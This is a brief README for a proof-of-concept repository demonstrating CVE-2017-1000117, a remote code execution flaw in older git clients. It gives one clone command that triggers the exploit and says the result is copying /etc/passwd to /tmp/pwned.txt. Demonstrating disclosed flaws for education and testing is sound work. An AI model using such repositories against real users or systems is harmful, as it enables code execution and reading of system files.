# git-client-rce
### This PoC is only for educational purpose!!!
Test GIT Repo for git-client-rce PoC ( CVE-2017-1000117 )

https://marc.info/?l=git&m=150238802328673&w=2

This CVE affects all the git clients < v2.14.1

Execute following on test system to see PoC :

$git clone --recursive https://github.com/thelastbyte/CVE-2017-1000117.git

Successful execution will result in copying content of /etc/passwd to /tmp/pwned.txt
